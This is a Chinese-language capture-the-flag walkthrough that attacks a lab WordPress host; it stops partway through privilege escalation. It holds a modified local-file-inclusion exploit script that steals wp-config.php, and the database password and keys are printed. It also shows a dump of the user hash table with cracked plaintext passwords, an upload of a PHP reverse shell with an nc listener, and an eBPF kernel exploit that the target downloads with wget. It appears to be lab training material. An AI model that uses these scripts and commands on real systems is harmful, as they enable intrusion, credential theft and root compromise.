 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 4.2.26
 |     References:
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 4.2.26
 |     References:
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 4.2.26
 |     References:
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 4.2.27
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 4.2.27
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 4.2.27
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 4.2.27
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 4.2.27
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695
 |
 | [!] Title: WordPress <= 5.2.3 - Hardening Bypass
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpscan.com/vulnerability/378d7df5-bce2-406a-86b2-ff79cd699920
 |      - https://blog.ripstech.com/2020/wordpress-hardening-bypass/
 |      - https://hackerone.com/reports/436928
 |      - https://wordpress.org/news/2019/11/wordpress-5-2-4-update/
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 |     Fixed in: 4.2.28
 |     References:
 |      - https://wpscan.com/vulnerability/741d07d1-2476-430a-b82f-e1228a9343a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4047
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8q2w-5m27-wm27
 |
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 |     Fixed in: 4.2.28
 |     References:
 |      - https://wpscan.com/vulnerability/12855f02-432e-4484-af09-7d0fbf596909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4048
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/10e2a50c523cf0b9785555a688d7d36a40fbeccf
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-q6pw-gvf4-5fj5
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
 |     Fixed in: 4.2.28
 |     References:
 |      - https://wpscan.com/vulnerability/d8addb42-e70b-4439-b828-fd0697e5d9d4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4049
 |      - https://www.exploit-db.com/exploits/48770/
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-87h4-phjv-rm6p
 |      - https://hackerone.com/reports/406289
 |
 | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
 |     Fixed in: 4.2.28
 |     References:
 |      - https://wpscan.com/vulnerability/b6f69ff1-4c11-48d2-b512-c65168988c45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4050
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/dda0ccdd18f6532481406cabede19ae2ed1f575d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4vpv-fgg2-gcqc
 |
 | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
 |     Fixed in: 4.2.28
 |     References:
 |      - https://wpscan.com/vulnerability/eea6dbf5-e298-44a7-9b0d-f078ad4741f9
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25286
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c075eec24f2f3214ab0d0fb0120a23082e6b1122
 |
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 |     Fixed in: 4.2.30
 |     References:
 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
 |      - https://www.youtube.com/watch?v=HaW15aMzBUM
 |
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 |     Fixed in: 5.8
 |     References:
 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/

[+] WordPress theme in use: bhost
 | Location: https://192.168.0.25:12380/blogblog/wp-content/themes/bhost/
 | Last Updated: 2021-11-29T00:00:00.000Z
 | Readme: https://192.168.0.25:12380/blogblog/wp-content/themes/bhost/readme.txt
 | [!] The version is out of date, the latest version is 1.4.9
 | Style URL: https://192.168.0.25:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
 | Style Name: BHost
 | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
 | Author: Masum Billah
 | Author URI: http://getmasum.net/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.9 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://192.168.0.25:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: 'Version: 1.2.9'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:12 <=======================================================================================================================================================> (96323 / 96323) 100.00% Time: 00:01:12
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] advanced-video-embed-embed-videos-or-playlists
 | Location: https://192.168.0.25:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-10-14T13:52:00.000Z
 | Readme: https://192.168.0.25:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.25:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.0.25:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt

[+] akismet
 | Location: https://192.168.0.25:12380/blogblog/wp-content/plugins/akismet/
 | Latest Version: 4.2.1
 | Last Updated: 2021-10-01T18:28:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.25:12380/blogblog/wp-content/plugins/akismet/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.

[+] shortcode-ui
 | Location: https://192.168.0.25:12380/blogblog/wp-content/plugins/shortcode-ui/
 | Last Updated: 2019-01-16T22:56:00.000Z
 | Readme: https://192.168.0.25:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
 | [!] The version is out of date, the latest version is 0.7.4
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.25:12380/blogblog/wp-content/plugins/shortcode-ui/, status: 200
 |
 | Version: 0.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.0.25:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt

[+] two-factor
 | Location: https://192.168.0.25:12380/blogblog/wp-content/plugins/two-factor/
 | Latest Version: 0.7.1
 | Last Updated: 2021-09-07T07:21:00.000Z
 | Readme: https://192.168.0.25:12380/blogblog/wp-content/plugins/two-factor/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - https://192.168.0.25:12380/blogblog/wp-content/plugins/two-factor/, status: 200
 |
 | The version could not be determined.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 4
 | Requests Remaining: 17

[+] Finished: Tue Dec 28 08:38:10 2021
[+] Requests Done: 96353
[+] Cached Requests: 44
[+] Data Sent: 28.332 MB
[+] Data Received: 12.928 MB
[+] Memory used: 491.113 MB
[+] Elapsed time: 00:01:22

```

搜索video插件漏洞利用脚本。

```
┌──(root💀kali)-[~/Desktop]
└─# searchsploit advanced video                                                                                  5 ⨯
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Advanced Video 1.0 - Local File Inclusion                         | php/webapps/39646.py
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

修改一下EXP脚本

```
import random
import re
import requests

# insert url to wordpress
url = "https://192.168.0.25:12380/blogblog"

# insert the path of the remote file to retrieve
file_path = '../wp-config.php'

randomID = str(int(random.random() * 100000000000))

exp_url = url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + randomID + '&short=rnd&term=rnd&thumb=' + file_path
html = requests.get(url=exp_url,verify=False)
content = html.text
id = int(re.findall("p=(\d+)",content)[0])/10

# # Grab the homepage from which we'll find the location of our thumbnail
index_req = requests.get(url=url,verify=False)
index_content = index_req.text

# Find the location of our remote file
linkstring = re.findall(str(int(id)) + '".*?\.jpeg', index_content)[0]
jpglink = linkstring.split('src="')[-1]

r = requests.get(url=jpglink,verify=False)
print(r.text)

```

查看wordpress配置文件

```
<?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

define('WP_HTTP_BLOCK_EXTERNAL', true);

```

找到MySQL账号密码：`root/plbkac`。MySQL登录

```
┌──(root💀kali)-[/tmp]
└─# mysql -uroot -pplbkac -h192.168.0.25
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 412
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| loot               |
| mysql              |
| performance_schema |
| phpmyadmin         |
| proof              |
| sys                |
| wordpress          |
+--------------------+
8 rows in set (0.007 sec)

```

获取wordpress数据库的用户名和密码。

```
MySQL [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [wordpress]> select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+------------+------------------------------------+
16 rows in set (0.001 sec)

```

整理成哈希文本

```
John:$P$B7889EMq/erHIuZapMB8GEizebcIy9.
Elly:$P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0
Peter:$P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0
barry:$P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0
heather:$P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10
garry:$P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1
harry:$P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0
scott:$P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1
kathy:$P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0
tim:$P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0
ZOE:$P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1
Dave:$P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy.
Simon:$P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0
Abby:$P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs.
Vicki:$P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131
Pam:$P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0
```

密码爆破列表如下

```
┌──(root💀kali)-[/tmp]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/1.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 16 password hashes with 16 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cookie           (scott)     
monkey           (harry)     
football         (garry)     
coolgirl         (kathy)     
washere          (barry)     
incorrect        (John)     
thumb            (tim)     
0520             (Pam)     
passphrase       (heather)     
damachine        (Dave)     
ylle             (Elly)     
partyqueen       (ZOE)     
12g 0:00:32:07 DONE (2021-12-28 10:07) 0.006226g/s 7441p/s 35775c/s 35775C/s  joefeher..*7¡Vamos!
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 

```

使用`john/incorrect`登录wordpress管理后台，上传[PHP反弹SHELL](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)。

![](<../../.gitbook/assets/image (1).png>)

访问上传文件目录（https://192.168.0.25:12380/blogblog/wp-content/uploads/），就可以找到反弹shell。

![](<../../.gitbook/assets/image (3) (1).png>)

nc反弹，查看内核版本为**4.4.0-21**和系统为**Ubuntu 16.04 32位**。

```
┌──(root💀kali)-[/opt]
└─# nc -lvp 1234             
listening on [any] 1234 ...
192.168.0.25: inverse host lookup failed: Unknown host
connect to [192.168.0.26] from (UNKNOWN) [192.168.0.25] 38174
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
 22:57:59 up  2:16,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
$ file /bin/cat
/bin/cat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2874f374614e9b7cd7b6cbb31e9dd3e59132943e, stripped

```

查找一下靶机的本地提权exp。40049.c是针对于64位系统

![](<../../.gitbook/assets/image (27) (1) (1) (1) (1) (1) (1) (1) (1).png>)

找到39772.txt

![](<../../.gitbook/assets/image (22) (1) (1) (1) (1) (1) (1).png>)

```
┌──(root💀kali)-[~/Desktop]
└─# cat /usr/share/exploitdb/exploits/linux/local/39772.txt
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=808

In Linux >=4.4, when the CONFIG_BPF_SYSCALL config option is set and the
kernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,
unprivileged code can use the bpf() syscall to load eBPF socket filter programs.
These conditions are fulfilled in Ubuntu 16.04.

When an eBPF program is loaded using bpf(BPF_PROG_LOAD, ...), the first
function that touches the supplied eBPF instructions is
replace_map_fd_with_map_ptr(), which looks for instructions that reference eBPF
map file descriptors and looks up pointers for the corresponding map files.
This is done as follows:

        /* look for pseudo eBPF instructions that access map FDs and
         * replace them with actual map pointers
         */
        static int replace_map_fd_with_map_ptr(struct verifier_env *env)
        {
                struct bpf_insn *insn = env->prog->insnsi;
                int insn_cnt = env->prog->len;
                int i, j;

                for (i = 0; i < insn_cnt; i++, insn++) {
                        [checks for bad instructions]

                        if (insn[0].code == (BPF_LD | BPF_IMM | BPF_DW)) {
                                struct bpf_map *map;
                                struct fd f;

                                [checks for bad instructions]

                                f = fdget(insn->imm);
                                map = __bpf_map_get(f);
                                if (IS_ERR(map)) {
                                        verbose("fd %d is not pointing to valid bpf_map\n",
                                                insn->imm);
                                        fdput(f);
                                        return PTR_ERR(map);
                                }

                                [...]
                        }
                }
                [...]
        }


__bpf_map_get contains the following code:

/* if error is returned, fd is released.
 * On success caller should complete fd access with matching fdput()
 */
struct bpf_map *__bpf_map_get(struct fd f)
{
        if (!f.file)
                return ERR_PTR(-EBADF);
        if (f.file->f_op != &bpf_map_fops) {
                fdput(f);
                return ERR_PTR(-EINVAL);
        }

        return f.file->private_data;
}

The problem is that when the caller supplies a file descriptor number referring
to a struct file that is not an eBPF map, both __bpf_map_get() and
replace_map_fd_with_map_ptr() will call fdput() on the struct fd. If
__fget_light() detected that the file descriptor table is shared with another
task and therefore the FDPUT_FPUT flag is set in the struct fd, this will cause
the reference count of the struct file to be over-decremented, allowing an
attacker to create a use-after-free situation where a struct file is freed
although there are still references to it.

A simple proof of concept that causes oopses/crashes on a kernel compiled with
memory debugging options is attached as crasher.tar.


One way to exploit this issue is to create a writable file descriptor, start a
write operation on it, wait for the kernel to verify the file's writability,
then free the writable file and open a readonly file that is allocated in the
same place before the kernel writes into the freed file, allowing an attacker
to write data to a readonly file. By e.g. writing to /etc/crontab, root
privileges can then be obtained.

There are two problems with this approach:

The attacker should ideally be able to determine whether a newly allocated
struct file is located at the same address as the previously freed one. Linux
provides a syscall that performs exactly this comparison for the caller:
kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, new_fd).

In order to make exploitation more reliable, the attacker should be able to
pause code execution in the kernel between the writability check of the target
file and the actual write operation. This can be done by abusing the writev()
syscall and FUSE: The attacker mounts a FUSE filesystem that artificially delays
read accesses, then mmap()s a file containing a struct iovec from that FUSE
filesystem and passes the result of mmap() to writev(). (Another way to do this
would be to use the userfaultfd() syscall.)

writev() calls do_writev(), which looks up the struct file * corresponding to
the file descriptor number and then calls vfs_writev(). vfs_writev() verifies
that the target file is writable, then calls do_readv_writev(), which first
copies the struct iovec from userspace using import_iovec(), then performs the
rest of the write operation. Because import_iovec() performs a userspace memory
access, it may have to wait for pages to be faulted in - and in this case, it
has to wait for the attacker-owned FUSE filesystem to resolve the pagefault,
allowing the attacker to suspend code execution in the kernel at that point
arbitrarily.

An exploit that puts all this together is in exploit.tar. Usage:

user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
user@host:~/ebpf_mapfd_doubleput$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@host:~/ebpf_mapfd_doubleput# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)

This exploit was tested on a Ubuntu 16.04 Desktop system.

Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7


Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552
Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip    
```

下载提权exp（[https://github.com/offensive-security/exploitdb-bin-sploits/blob/master/bin-sploits/39772.zip](https://github.com/offensive-security/exploitdb-bin-sploits/blob/master/bin-sploits/39772.zip)）

解压压缩包，部署http，让靶机下载EXP。

```
┌──(root💀kali)-[/opt]
└─# unzip 39772.zip
Archive:  39772.zip
   creating: 39772/
  inflating: 39772/.DS_Store         
   creating: __MACOSX/
   creating: __MACOSX/39772/
  inflating: __MACOSX/39772/._.DS_Store  
  inflating: 39772/crasher.tar       
  inflating: __MACOSX/39772/._crasher.tar  
  inflating: 39772/exploit.tar       
  inflating: __MACOSX/39772/._exploit.tar  
 
┌──(root💀kali)-[/opt/39772]
└─# python2 -m SimpleHTTPServer                                                                                 1 ⨯
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.0.25 - - [28/Dec/2021 10:17:37] "GET /exploit.tar HTTP/1.1" 200 -
```

靶机下载EXP。

```
$ cd /tmp
$ wget http://192.168.0.26:8000/exploit.tar
--2021-12-28 23:18:57--  http://192.168.0.26:8000/exploit.tar
Connecting to 192.168.0.26:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/x-tar]
Saving to: 'exploit.tar'

     0K .......... ..........                                 100%  132M=0s

2021-12-28 23:18:57 (132 MB/s) - 'exploit.tar' saved [20480/20480]

```

靶机提权

```
$ tar xvf exploit.tar
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
